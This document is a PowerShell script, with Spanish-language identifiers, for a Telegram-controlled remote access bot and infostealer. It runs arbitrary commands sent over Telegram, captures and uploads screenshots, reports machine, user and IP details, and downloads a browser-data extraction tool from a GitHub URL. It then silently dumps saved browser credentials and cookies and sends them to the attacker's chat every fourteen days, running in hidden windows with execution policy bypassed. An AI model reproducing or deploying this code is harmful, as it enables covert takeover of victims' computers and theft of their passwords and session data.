param(
    [Parameter(Mandatory = $true)]
    [string]$Token,

    [Parameter(Mandatory = $true)]
    [string]$ChatId
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

$Script:ApiUrl = 'https://api.telegram.org/bot' + $Token
$Script:LogPath = Join-Path $env:APPDATA 'CarpetaDos\debug.log'
$Script:BotConfig = [ordered]@{
    LastUpdateId = 0
    EstadoInternet = $false
    PrimeraEjecucion = $true
}

$null = New-Item -ItemType Directory -Path (Split-Path $Script:LogPath) -Force -ErrorAction SilentlyContinue
try {
    Start-Transcript -Path $Script:LogPath -Force | Out-Null
}
catch {
    Write-Host 'Transcript no iniciado; continuando sin transcripción.'
}

Add-Type -AssemblyName System.Windows.Forms | Out-Null
Add-Type -AssemblyName System.Drawing | Out-Null

function Write-Log {
    param([string]$Message)
    try {
        $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -Path $Script:LogPath -Value "[$stamp] $Message" -ErrorAction Stop
    }
    catch {
    }
}

function Get-ErrorText {
    param($Exception)
    if ($null -eq $Exception) { return 'Unknown error' }
    if ($Exception.Message) { return $Exception.Message }
    return $Exception.ToString()
}

function Obtener-RutaEstadoSteal {
    return Join-Path $env:APPDATA 'CarpetaDos\steal_state.json'
}

function Cargar-EstadoSteal {
    $ruta = Obtener-RutaEstadoSteal
    $estado = [ordered]@{
        ultimaEjecucion = $null
        ultimaEjecucionExito = $null
        ultimoResultado = $false
        ultimaMarca = $null
    }

    try {
        if (Test-Path -LiteralPath $ruta) {
            $json = Get-Content -LiteralPath $ruta -Raw -ErrorAction Stop
            if (-not [string]::IsNullOrWhiteSpace($json)) {
                $obj = $json | ConvertFrom-Json
                if ($null -ne $obj) {
                    if ($obj.PSObject.Properties.Name -contains 'ultimaEjecucion') { $estado.ultimaEjecucion = $obj.ultimaEjecucion }
                    if ($obj.PSObject.Properties.Name -contains 'ultimaEjecucionExito') { $estado.ultimaEjecucionExito = $obj.ultimaEjecucionExito }
                    if ($obj.PSObject.Properties.Name -contains 'ultimoResultado') { $estado.ultimoResultado = [bool]$obj.ultimoResultado }
                    if ($obj.PSObject.Properties.Name -contains 'ultimaMarca') { $estado.ultimaMarca = $obj.ultimaMarca }
                }
            }
        }
    }
    catch {
        Write-Log ('No se pudo leer estado de steal: ' + (Get-ErrorText $_.Exception))
    }

    return $estado
}

function Guardar-EstadoSteal {
    param([hashtable]$Estado)

    $ruta = Obtener-RutaEstadoSteal
    $dir = Split-Path -Parent $ruta
    $null = New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue

    try {
        $Estado | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $ruta -Encoding UTF8 -ErrorAction Stop
        return $true
    }
    catch {
        Write-Log ('No se pudo guardar estado de steal: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Debe-Ejecutar-Steal {
    $estado = Cargar-EstadoSteal
    $now = Get-Date

    if ($null -eq $estado.ultimaEjecucion) {
        return $true
    }

    try {
        $last = [DateTime]::Parse($estado.ultimaEjecucion)
        $elapsed = $now - $last
        return ($elapsed.TotalDays -ge 14)
    }
    catch {
        return $true
    }
}

function Iniciar-ExtraccionEnSegundoPlano {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [bool]$silencioso = $false
    )

    $estado = Cargar-EstadoSteal
    $ahora = (Get-Date).ToString('o')
    $estado.ultimaEjecucion = $ahora
    $estado.ultimaMarca = $ahora
    $estado.ultimoResultado = $false
    $null = Guardar-EstadoSteal -Estado $estado

    $worker = Join-Path $env:APPDATA 'CarpetaDos\steal_worker.ps1'
    $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
    if ([string]::IsNullOrWhiteSpace($scriptDir)) {
        $scriptDir = (Get-Location).Path
    }

    $worker = Join-Path $scriptDir 'steal_worker.ps1'
    if (-not (Test-Path -LiteralPath $worker)) {
        $worker = Join-Path $env:APPDATA 'CarpetaDos\steal_worker.ps1'
    }

    if (-not (Test-Path -LiteralPath $worker)) {
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto 'No se encontró el worker de extracción de navegadores.'
        }
        Write-Log 'No existe steal_worker.ps1'
        return $false
    }

    try {
        $p = Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $worker, '-Token', $Token, '-ChatId', $chatId, '-StatePath', (Obtener-RutaEstadoSteal)) -WindowStyle Hidden -PassThru
        if ($null -ne $p) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto 'Extracción en segundo plano iniciada. Te aviso cuando termine.'
            }
            return $true
        }

        Write-Log 'No se pudo iniciar el proceso de extracción en segundo plano.'
        return $false
    }
    catch {
        Write-Log ('Error arrancando steal worker: ' + (Get-ErrorText $_.Exception))
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto 'No se pudo iniciar la extracción en segundo plano.'
        }
        return $false
    }
}

function Enviar-Mensaje {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$texto
    )

    try {
        if ([string]::IsNullOrWhiteSpace($texto)) { return $false }

        $body = @{ chat_id = $chatId; text = $texto; parse_mode = 'Markdown' } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        Write-Log ('Error enviando mensaje: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Enviar-MensajeLargo {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$texto
    )

    $max = 4000
    if ($texto.Length -le $max) {
        return (Enviar-Mensaje -chatId $chatId -texto $texto)
    }

    $partes = [Math]::Ceiling($texto.Length / $max)
    $ok = $true
    for ($i = 0; $i -lt $partes; $i++) {
        $inicio = $i * $max
        $longitud = [Math]::Min($max, $texto.Length - $inicio)
        $parte = $texto.Substring($inicio, $longitud)
        $body = @{ chat_id = $chatId; text = '```' + $parte + '```'; parse_mode = 'Markdown' } | ConvertTo-Json -Compress

        try {
            Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
        }
        catch {
            Write-Log ('Error enviando mensaje largo: ' + (Get-ErrorText $_.Exception))
            $ok = $false
        }

        Start-Sleep -Milliseconds 300
    }

    return $ok
}

function Enviar-DocumentoRaw {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$rutaArchivo,
        [string]$caption = $null
    )

    try {
        if (-not (Test-Path -LiteralPath $rutaArchivo)) {
            Write-Log ('Archivo no existe: ' + $rutaArchivo)
            return $false
        }

        $file = Get-Item -LiteralPath $rutaArchivo
        $uri = $Script:ApiUrl + '/sendDocument'

        $form = @{
            chat_id = $chatId
            document = $file
        }

        if (-not [string]::IsNullOrWhiteSpace($caption)) {
            $form.caption = $caption
        }

        $response = Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
        Write-Log ('Enviado: ' + $file.Name + ' - OK: ' + $response.ok)
        return $true
    }
    catch {
        Write-Log ('Error enviando doc raw: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Enviar-Foto {
    param(
        [Parameter(Mandatory = $true)] [string]$chatId,
        [Parameter(Mandatory = $true)] [string]$rutaFoto,
        [string]$titulo = ''
    )

    try {
        if (-not (Test-Path -LiteralPath $rutaFoto)) {
            return $false
        }

        $uri = $Script:ApiUrl + '/sendPhoto'
        $file = Get-Item -LiteralPath $rutaFoto
        $form = @{
            chat_id = $chatId
            photo = $file
        }

        if (-not [string]::IsNullOrWhiteSpace($titulo)) {
            $form.caption = $titulo
        }

        Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        Write-Log ('Error enviando foto: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Tomar-Captura {
    param([string]$chatId)

    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)

        $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
        $ruta = Join-Path $env:TEMP ('capture_' + $timestamp + '.png')
        $bitmap.Save($ruta, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()

        $enviado = Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo ('Screenshot - ' + $timestamp)
        Start-Sleep -Seconds 1
        Remove-Item -LiteralPath $ruta -Force -ErrorAction SilentlyContinue
        return $enviado
    }
    catch {
        Write-Log ('Error captura: ' + (Get-ErrorText $_.Exception))
        return $false
    }
}

function Obtener-HackBrowserDataPath {
    $candidatos = @()

    $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
    if ([string]::IsNullOrWhiteSpace($scriptDir)) {
        $scriptDir = (Get-Location).Path
    }

    $destDir = Join-Path $env:APPDATA 'CarpetaDos'
    $candidatos += (Join-Path $scriptDir 'hackbrowserdata.exe')
    $candidatos += (Join-Path $scriptDir 'hack-browser-data.exe')
    $candidatos += (Join-Path $destDir 'hackbrowserdata.exe')
    $candidatos += (Join-Path $destDir 'hack-browser-data.exe')

    foreach ($ruta in $candidatos) {
        if (-not [string]::IsNullOrWhiteSpace($ruta) -and (Test-Path -LiteralPath $ruta)) {
            return $ruta
        }
    }

    $null = New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue
    $fallbackUrl = 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/hack-browser-data.exe'
    $fallbackPath = Join-Path $destDir 'hackbrowserdata.exe'

    try {
        Invoke-WebRequest -Uri $fallbackUrl -OutFile $fallbackPath -TimeoutSec 120 -UseBasicParsing | Out-Null
        if (Test-Path -LiteralPath $fallbackPath) {
            return $fallbackPath
        }
    }
    catch {
        Write-Log ('No se pudo descargar HackBrowserData: ' + (Get-ErrorText $_.Exception))
    }

    return $null
}

function Ejecutar-HackBrowserData {
    param(
        [string]$chatId,
        [bool]$silencioso = $false
    )

    try {
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto 'Extrayendo datos de navegadores con HackBrowserData...'
        }

        $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
        $tempDir = Join-Path $env:TEMP ('BrowserData_' + $timestamp)
        $null = New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction SilentlyContinue

        $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
        if ([string]::IsNullOrWhiteSpace($scriptDir)) {
            $scriptDir = (Get-Location).Path
        }

        $hackBrowserPath = Obtener-HackBrowserDataPath
        if ([string]::IsNullOrWhiteSpace($hackBrowserPath)) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto 'Error: No se encontro hackbrowserdata.exe ni pudo descargarse.'
            }
            Write-Log 'hackbrowserdata.exe no encontrado ni descargado'
            return $false
        }

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $hackBrowserPath
        $psi.Arguments = 'dump -b all -c all -f json -d "' + $tempDir + '"'
        $psi.WorkingDirectory = $scriptDir
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true

        $process = [System.Diagnostics.Process]::Start($psi)
        $process.WaitForExit()

        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()

        Write-Log ('HackBrowserData stdout: ' + $stdout)
        Write-Log ('HackBrowserData stderr: ' + $stderr)
        Write-Log ('Exit code: ' + $process.ExitCode)

        if ($process.ExitCode -ne 0) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto ('Error ejecutando HackBrowserData: ' + $stderr.Trim())
            }
            Write-Log ('HackBrowserData fallo con codigo: ' + $process.ExitCode)
            Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            return $false
        }

        $arquivosJSON = Get-ChildItem -Path $tempDir -Filter '*.json' -Recurse -ErrorAction SilentlyContinue
        if ($null -eq $arquivosJSON -or $arquivosJSON.Count -eq 0) {
            if (-not $silencioso) {
                Enviar-Mensaje -chatId $chatId -texto 'No se generaron archivos JSON. Verifica que los navegadores esten instalados.'
            }
            Write-Log 'No se encontraron archivos JSON'
            Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue
            return $false
        }

        $enviados = 0
        $errores = @()
        foreach ($archivo in $arquivosJSON) {
            $nombreOriginal = $archivo.Name
            $nombreConTimestamp = $archivo.BaseName + '_' + $timestamp + '.json'
            $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
            Rename-Item -LiteralPath $archivo.FullName -NewName $nombreConTimestamp -Force

            $caption = '[' + $nombreOriginal + '] - ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            Write-Log ('Enviando: ' + $nombreConTimestamp)

            if (Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $rutaRenombrado -caption $caption) {
                $enviados++
            }
            else {
                $errores += $nombreOriginal
            }

            Start-Sleep -Milliseconds 300
        }

        Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue

        $mensaje = 'Extraccion completada. Archivos enviados: ' + [string]$enviados
        if ($errores.Count -gt 0) {
            $mensaje += ' Errores: ' + [string]$errores.Count
        }

        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto $mensaje
        }

        Write-Log $mensaje
        return ($enviados -gt 0)
    }
    catch {
        Write-Log ('Error en Ejecutar-HackBrowserData: ' + (Get-ErrorText $_.Exception))
        if (-not $silencioso) {
            Enviar-Mensaje -chatId $chatId -texto ('Error extrayendo datos: ' + (Get-ErrorText $_.Exception))
        }
        return $false
    }
}

function Probar-Conexion {
    try {
        Invoke-RestMethod -Uri 'https://api.telegram.org' -Method Head -TimeoutSec 5 -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

function Obtener-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip
        return 'PC: ' + $env:COMPUTERNAME + ' | User: ' + $env:USERNAME + ' | IP: ' + $ip
    }
    catch {
        return 'PC: ' + $env:COMPUTERNAME + ' | User: ' + $env:USERNAME
    }
}

function Obtener-DirectorioActual {
    try {
        return (Get-Location).Path
    }
    catch {
        return $env:TEMP
    }
}

function Ejecutar-Comando {
    param(
        [Parameter(Mandatory = $true)] [string]$comando,
        [Parameter(Mandatory = $true)] [string]$chatId
    )

    try {
        Write-Log ('Ejecutando comando: ' + $comando)
        $dirActual = Obtener-DirectorioActual
        $salida = Invoke-Expression $comando 2>&1 | Out-String
        $resultado = 'Directorio: ' + $dirActual + "`n" + ('=' * 50) + "`n" + $salida

        if ([string]::IsNullOrWhiteSpace($salida)) {
            $resultado += '(Sin salida)'
        }

        if ($resultado.Length -gt 4000) {
            Enviar-MensajeLargo -chatId $chatId -texto $resultado
        }
        else {
            Enviar-Mensaje -chatId $chatId -texto ('```' + $resultado + '```')
        }

        return $true
    }
    catch {
        $msg = 'Error ejecutando comando: ' + (Get-ErrorText $_.Exception)
        Write-Log $msg
        Enviar-Mensaje -chatId $chatId -texto $msg
        return $false
    }
}

function Listar-Directorio {
    param([string]$chatId)

    try {
        $dirActual = Obtener-DirectorioActual
        $items = Get-ChildItem -ErrorAction SilentlyContinue | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
        $resultado = 'Directorio: ' + $dirActual + "`n" + ('=' * 50) + "`n" + $items
        Enviar-Mensaje -chatId $chatId -texto ('```' + $resultado + '```')
        return $true
    }
    catch {
        $msg = 'Error listando directorio: ' + (Get-ErrorText $_.Exception)
        Write-Log $msg
        Enviar-Mensaje -chatId $chatId -texto $msg
        return $false
    }
}

function Cambiar-Directorio {
    param(
        [Parameter(Mandatory = $true)] [string]$ruta,
        [Parameter(Mandatory = $true)] [string]$chatId
    )

    try {
        Set-Location -Path $ruta -ErrorAction Stop
        $nuevoDir = Obtener-DirectorioActual
        Enviar-Mensaje -chatId $chatId -texto 'Directorio cambiado a: ' + $nuevoDir
        return $true
    }
    catch {
        $msg = "Error: No se pudo cambiar a '$ruta'"
        Write-Log $msg
        Enviar-Mensaje -chatId $chatId -texto $msg
        return $false
    }
}

function Procesar-Mensaje {
    param(
        [Parameter(Mandatory = $true)] $mensaje,
        [Parameter(Mandatory = $true)] [string]$chatId
    )

    try {
        if ($null -eq $mensaje -or [string]::IsNullOrWhiteSpace($mensaje.text)) {
            return
        }

        $txt = $mensaje.text.Trim()
        $txtLower = $txt.ToLowerInvariant()
        Write-Log ('Comando recibido: ' + $txt)

        if ($txtLower -eq 'ls' -or $txtLower -eq '/ls') {
            Listar-Directorio -chatId $chatId
        }
        elseif ($txtLower -match '^cmd\s+(.+)') {
            Ejecutar-Comando -comando $matches[1] -chatId $chatId
        }
        elseif ($txtLower -match '^/cmd\s+(.+)') {
            Ejecutar-Comando -comando $matches[1] -chatId $chatId
        }
        elseif ($txtLower -match '^cd\s+(.+)') {
            Cambiar-Directorio -ruta $matches[1] -chatId $chatId
        }
        elseif ($txtLower -match '^/cd\s+(.+)') {
            Cambiar-Directorio -ruta $matches[1] -chatId $chatId
        }
        elseif ($txtLower -eq '/pwd' -or $txtLower -eq 'pwd') {
            Enviar-Mensaje -chatId $chatId -texto ('Directorio actual: ' + (Obtener-DirectorioActual))
        }
        elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
            if (Debe-Ejecutar-Steal) {
                Iniciar-ExtraccionEnSegundoPlano -chatId $chatId
            }
            else {
                $estado = Cargar-EstadoSteal
                $fecha = [DateTime]::Parse($estado.ultimaEjecucion)
                $proximo = $fecha.AddDays(14)
                Enviar-Mensaje -chatId $chatId -texto ('La extracción ya se ejecutó recientemente. Próxima vez disponible: ' + $proximo.ToString('yyyy-MM-dd HH:mm'))
            }
        }
        elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
            Tomar-Captura -chatId $chatId | Out-Null
        }
        elseif ($txtLower -eq 'info' -or $txtLower -eq '/info') {
            $info = Obtener-Info
            $dir = Obtener-DirectorioActual
            Enviar-Mensaje -chatId $chatId -texto ($info + "`nDirectorio: " + $dir)
        }
        elseif ($txtLower -eq 'help' -or $txtLower -eq '/help') {
            $ayuda = @'
Comandos disponibles:
/ls - Listar archivos en directorio actual
/cmd comando - Ejecutar comando PowerShell
/cd ruta - Cambiar de directorio
/pwd - Mostrar directorio actual
/steal - Extraer datos de navegadores
/captura - Tomar screenshot
/info - Informacion del sistema
/help - Mostrar esta ayuda
'@
            Enviar-Mensaje -chatId $chatId -texto $ayuda
        }
    }
    catch {
        Write-Log ('Error procesando mensaje: ' + (Get-ErrorText $_.Exception))
    }
}

function Bot-BuclePrincipal {
    while ($true) {
        try {
            $net = Probar-Conexion
            if ($net -and -not $Script:BotConfig.EstadoInternet) {
                $Script:BotConfig.EstadoInternet = $true
                if ($Script:BotConfig.PrimeraEjecucion) {
                    $Script:BotConfig.PrimeraEjecucion = $false
                    Enviar-Mensaje -chatId $ChatId -texto ('Conectado - ' + (Obtener-Info) + "`nChequeando extracción de navegadores...")
                    Start-Sleep -Seconds 2
                    if (Debe-Ejecutar-Steal) {
                        Iniciar-ExtraccionEnSegundoPlano -chatId $ChatId -silencioso $true | Out-Null
                    }
                }
            }
            elseif (-not $net) {
                $Script:BotConfig.EstadoInternet = $false
                Start-Sleep -Seconds 10
                continue
            }

            $offset = $Script:BotConfig.LastUpdateId + 1
            $url = $Script:ApiUrl + '/getUpdates?offset=' + [string]$offset + '&limit=5'
            $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20 -ErrorAction Stop

            if ($res.ok -and $res.result.Count -gt 0) {
                foreach ($up in $res.result) {
                    try {
                        $Script:BotConfig.LastUpdateId = [long]$up.update_id
                        $msg = $up.message

                        if ($null -ne $msg -and [string]$msg.from.id -eq [string]$ChatId) {
                            Procesar-Mensaje -mensaje $msg -chatId ([string]$msg.chat.id)
                        }
                    }
                    catch {
                        Write-Log ('Error iterando update: ' + (Get-ErrorText $_.Exception))
                    }
                }
            }
        }
        catch {
            Write-Log ('Error loop principal: ' + (Get-ErrorText $_.Exception))
        }

        Start-Sleep -Seconds 1
    }
}

try {
    Enviar-Mensaje -chatId $ChatId -texto ('Bot iniciado en ' + (Obtener-Info))
    Bot-BuclePrincipal
}
catch {
    $msg = 'Fallo global: ' + (Get-ErrorText $_.Exception)
    Write-Log $msg
    try {
        Enviar-Mensaje -chatId $ChatId -texto 'Bot reiniciando...'
    }
    catch {
    }
    Start-Sleep -Seconds 5
    exit 1
}
